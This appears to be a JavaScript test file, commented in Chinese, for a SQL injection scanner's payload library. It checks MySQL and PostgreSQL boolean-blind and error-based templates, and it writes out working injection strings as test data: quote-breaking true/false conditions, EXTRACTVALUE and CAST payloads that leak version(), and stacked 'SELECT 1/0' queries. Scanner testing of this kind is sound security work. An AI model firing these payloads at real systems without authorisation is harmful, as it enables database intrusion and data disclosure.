// 子句深度扩容验收测试（DELETE WHERE / GROUP BY / HAVING / ORDER BY / LIMIT PROCEDURE ANALYSE / OFFSET FETCH）
// 验证：
//   1) MySQL boolean 末尾追加 DELETE WHERE 真假子查询模板（不移除前 8 项索引）
//   2) MySQL boolean 追加 GROUP BY / ORDER BY 表达式扩展（列数差异变体）
//   3) MySQL error 追加 HAVING 1=1 与 LIMIT PROCEDURE ANALYSE 变体
//   4) PostgreSQL boolean 追加 DELETE USING AND 谓词模板
//   5) PostgreSQL error 追加 HAVING CAST 报错 与 OFFSET FETCH 分页报错
//   6) 固定索引对 [0,2]/[1,3]/[4,5]/[6,7] 未被破坏（BooleanBlindDetector 依赖）
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { PAYLOADS, fillPayload } from '../src/engine/payloads.js';

const MYSQL_BOOLEAN = PAYLOADS.MySQL.boolean;
const MYSQL_ERROR = PAYLOADS.MySQL.error;
const PG_BOOLEAN = PAYLOADS.PostgreSQL.boolean;
const PG_ERROR = PAYLOADS.PostgreSQL.error;

// —— 1) MySQL boolean：DELETE WHERE 真假子查询模板（末尾追加，仅遍历时跳过前 8 项）——
test('MySQL boolean 末尾包含 DELETE 子查询模板（(SELECT 1)=(SELECT 1/2)）', () => {
  assert.ok(
    MYSQL_BOOLEAN.includes('{ORIG} AND (SELECT 1)=(SELECT 1)-- -'),
    'MySQL boolean 应含 DELETE 真子查询 {ORIG} AND (SELECT 1)=(SELECT 1)-- -'
  );
  assert.ok(
    MYSQL_BOOLEAN.includes('{ORIG} AND (SELECT 1)=(SELECT 2)-- -'),
    'MySQL boolean 应含 DELETE 假子查询 {ORIG} AND (SELECT 1)=(SELECT 2)-- -'
  );
  // 真/假模板填充后不可相同
  const t = fillPayload('{ORIG} AND (SELECT 1)=(SELECT 1)-- -', { orig: '1' });
  const f = fillPayload('{ORIG} AND (SELECT 1)=(SELECT 2)-- -', { orig: '1' });
  assert.notEqual(t, f);
  assert.ok(t.includes('(SELECT 1)=(SELECT 1)') && f.includes('(SELECT 1)=(SELECT 2)'));
  // 该对位于前 8 项之后（DELETE 模板为纯追加，不占 BooleanBlindDetector 固定索引）
  assert.ok(MYSQL_BOOLEAN.indexOf('{ORIG} AND (SELECT 1)=(SELECT 1)-- -') >= 8);
  assert.ok(MYSQL_BOOLEAN.indexOf('{ORIG} AND (SELECT 1)=(SELECT 2)-- -') >= 8);
});

// —— 2) MySQL boolean：GROUP BY / ORDER BY 表达式扩展（末尾追加）——
test('MySQL boolean 末尾包含 GROUP BY 1 固定分组模板', () => {
  assert.ok(MYSQL_BOOLEAN.includes('{ORIG} GROUP BY 1-- -'), 'MySQL boolean 应含 {ORIG} GROUP BY 1-- -');
  assert.ok(MYSQL_BOOLEAN.indexOf('{ORIG} GROUP BY 1-- -') >= 8, 'GROUP BY 模板应位于前 8 项之后');
});

test('MySQL boolean 末尾包含 ORDER BY 列数差异变体（ORDER BY 1 vs 1,2）', () => {
  assert.ok(MYSQL_BOOLEAN.includes('{ORIG} ORDER BY 1-- -'), 'MySQL boolean 应含单列排序基线');
  assert.ok(MYSQL_BOOLEAN.includes('{ORIG} ORDER BY 1,2-- -'), 'MySQL boolean 应含双列排序差异变体');
  const t = fillPayload('{ORIG} ORDER BY 1-- -', { orig: 'id' });
  const f = fillPayload('{ORIG} ORDER BY 1,2-- -', { orig: 'id' });
  assert.notEqual(t, f, 'ORDER BY 1 与 ORDER BY 1,2 填充后应不同（列数差异）');
  assert.ok(MYSQL_BOOLEAN.indexOf('{ORIG} ORDER BY 1-- -') >= 8);
  assert.ok(MYSQL_BOOLEAN.indexOf('{ORIG} ORDER BY 1,2-- -') >= 8);
});

// —— 3) MySQL error：HAVING 1=1 与 LIMIT PROCEDURE ANALYSE 变体 ——
test('MySQL error 包含 HAVING 1=1 变体', () => {
  assert.ok(MYSQL_ERROR.includes('{ORIG} HAVING 1=1-- -'), 'MySQL error 应含 {ORIG} HAVING 1=1-- -');
});

test('MySQL error 包含 LIMIT PROCEDURE ANALYSE 变体（EXTRACTVALUE 回带 version()）', () => {
  const tpl = '{ORIG} LIMIT 1,1 PROCEDURE ANALYSE(EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()))))-- -';
  assert.ok(MYSQL_ERROR.includes(tpl), 'MySQL error 应含 LIMIT PROCEDURE ANALYSE 变体');
  assert.ok(tpl.includes('PROCEDURE ANALYSE'), '应含 PROCEDURE ANALYSE 关键字');
  assert.ok(tpl.includes('EXTRACTVALUE') && tpl.includes('version()'), '应经 EXTRACTVALUE 回带 version()');
  assert.ok(tpl.startsWith('{ORIG} LIMIT 1,1'), '应带 LIMIT 1,1 前缀（LIMIT 子句位置）');
});

// —— 4) PostgreSQL boolean：DELETE USING AND 谓词模板 ——
test('PostgreSQL boolean 包含 DELETE USING AND 谓词模板（AND 1=1 vs AND 1=2）', () => {
  assert.ok(PG_BOOLEAN.includes('{ORIG} AND 1=1-- -'), 'PG boolean 应含 DELETE USING 真谓词 {ORIG} AND 1=1-- -');
  assert.ok(PG_BOOLEAN.includes('{ORIG} AND 1=2-- -'), 'PG boolean 应含 DELETE USING 假谓词 {ORIG} AND 1=2-- -');
  // 与 [4,5] 无注释版本（{ORIG} AND 1=1）区分：新模板为 -- - 结尾（子句位置追加）
  assert.ok(PG_BOOLEAN.indexOf('{ORIG} AND 1=1-- -') >= 8, 'DELETE USING 模板应位于前 8 项之后');
  assert.ok(PG_BOOLEAN.indexOf('{ORIG} AND 1=2-- -') >= 8);
  const t = fillPayload('{ORIG} AND 1=1-- -', { orig: 'id=1' });
  const f = fillPayload('{ORIG} AND 1=2-- -', { orig: 'id=1' });
  assert.notEqual(t, f);
  assert.ok(t.endsWith('-- -') && f.endsWith('-- -'));
});

// —— 5) PostgreSQL error：HAVING CAST 报错 与 OFFSET FETCH 分页报错 ——
test('PostgreSQL error 包含 HAVING CAST 报错（1=CAST(version() AS integer)）', () => {
  const tpl = '{ORIG} HAVING 1=1 AND 1=CAST((SELECT version()) AS integer)-- -';
  assert.ok(PG_ERROR.includes(tpl), 'PG error 应含 HAVING CAST 报错变体');
  assert.ok(tpl.includes('HAVING 1=1'), '应含 HAVING 子句前缀');
  assert.ok(tpl.includes('1=CAST((SELECT version()) AS integer)'), '应含 CAST(version() AS integer) 类型转换（失败回带版本串）');
});

test('PostgreSQL error 包含 OFFSET FETCH 分页报错（OFFSET 0 ROWS FETCH FIRST 1 ROWS ONLY; SELECT 1/0）', () => {
  const tpl = '{ORIG} OFFSET 0 ROWS FETCH FIRST 1 ROWS ONLY; SELECT 1/0-- -';
  assert.ok(PG_ERROR.includes(tpl), 'PG error 应含 OFFSET FETCH 分页报错变体');
  assert.ok(tpl.includes('OFFSET 0 ROWS FETCH FIRST 1 ROWS ONLY'), '应含完整 OFFSET/FETCH 分页语法');
  assert.ok(tpl.includes('SELECT 1/0'), '应含堆叠除零触发语句');
  // 与既有 FETCH FIRST 基础变体互补（新增 OFFSET 0 ROWS 前缀，两者并存）
  assert.ok(PG_ERROR.includes('{ORIG} FETCH FIRST 1 ROWS ONLY; SELECT 1/0-- -'), '既有 FETCH FIRST 基础变体应保留');
});

// —— 6) 固定索引对 [0,2]/[1,3]/[4,5]/[6,7] 未被破坏（BooleanBlindDetector 依赖，零回归约束）——
test('MySQL boolean [0,2]/[1,3]/[4,5]/[6,7] 真假对未被破坏', () => {
  assert.equal(MYSQL_BOOLEAN[0], "{ORIG}' AND '1'='1", '[0] 单引号真条件');
  assert.equal(MYSQL_BOOLEAN[2], "{ORIG}' AND '1'='2", '[2] 单引号假条件');
  assert.equal(MYSQL_BOOLEAN[1], '{ORIG}" AND "1"="1', '[1] 双引号真条件');
  assert.equal(MYSQL_BOOLEAN[3], '{ORIG}" AND "1"="2', '[3] 双引号假条件');
  assert.equal(MYSQL_BOOLEAN[4], '{ORIG} AND 1=1', '[4] 数字真条件');
  assert.equal(MYSQL_BOOLEAN[5], '{ORIG} AND 1=2', '[5] 数字假条件');
  assert.equal(MYSQL_BOOLEAN[6], "{ORIG}' OR '1'='1", '[6] OR 真条件');
  assert.equal(MYSQL_BOOLEAN[7], "{ORIG}' OR '1'='2", '[7] OR 假条件');
  assert.equal(MYSQL_BOOLEAN.slice(0, 8).length, 8, '前 8 项数量不变（扩容仅 append）');
});

test('PostgreSQL boolean [0,2]/[1,3]/[4,5]/[6,7] 真假对未被破坏', () => {
  assert.equal(PG_BOOLEAN[0], "{ORIG}' AND '1'='1", '[0] 单引号真条件');
  assert.equal(PG_BOOLEAN[2], "{ORIG}' AND '1'='2", '[2] 单引号假条件');
  assert.equal(PG_BOOLEAN[1], '{ORIG}" AND "1"="1', '[1] 双引号真条件');
  assert.equal(PG_BOOLEAN[3], '{ORIG}" AND "1"="2', '[3] 双引号假条件');
  assert.equal(PG_BOOLEAN[4], '{ORIG} AND 1=1', '[4] 数字真条件');
  assert.equal(PG_BOOLEAN[5], '{ORIG} AND 1=2', '[5] 数字假条件');
  assert.equal(PG_BOOLEAN[6], "{ORIG}' OR '1'='1", '[6] OR 真条件');
  assert.equal(PG_BOOLEAN[7], "{ORIG}' OR '1'='2", '[7] OR 假条件');
  assert.equal(PG_BOOLEAN.slice(0, 8).length, 8, '前 8 项数量不变（扩容仅 append）');
});

// —— 7) 追加合法性：新增模板结构约束（{ORIG} 开头、-- - 结尾）与数组无重复 ——
test('追加后 MySQL/PG boolean 与 error 无重复模板且均含 {ORIG}', () => {
  for (const [db, arr] of Object.entries({
    'MySQL.boolean': MYSQL_BOOLEAN,
    'MySQL.error': MYSQL_ERROR,
    'PostgreSQL.boolean': PG_BOOLEAN,
    'PostgreSQL.error': PG_ERROR,
  })) {
    const seen = new Set();
    for (const p of arr) {
      assert.ok(typeof p === 'string' && p.includes('{ORIG}'), `[${db}] 缺 {ORIG}: ${p}`);
      assert.ok(!seen.has(p), `[${db}] 存在重复模板: ${p}`);
      seen.add(p);
    }
  }
});

// —— 8) 新增模板数量统计（供实施报告核对：MySQL boolean +5 / error +2；PG boolean +2 / error +2）——
test('子句深度扩容数量：MySQL boolean ≥28 / error ≥30；PG boolean ≥16 / error ≥32', () => {
  assert.ok(MYSQL_BOOLEAN.length >= 28, `MySQL boolean 应 ≥28（23 基础 + 5 扩容），实际 ${MYSQL_BOOLEAN.length}`);
  assert.ok(MYSQL_ERROR.length >= 30, `MySQL error 应 ≥30（28 基础 + 2 扩容），实际 ${MYSQL_ERROR.length}`);
  assert.ok(PG_BOOLEAN.length >= 16, `PG boolean 应 ≥16（14 基础 + 2 扩容），实际 ${PG_BOOLEAN.length}`);
  assert.ok(PG_ERROR.length >= 32, `PG error 应 ≥32（30 基础 + 2 扩容），实际 ${PG_ERROR.length}`);
});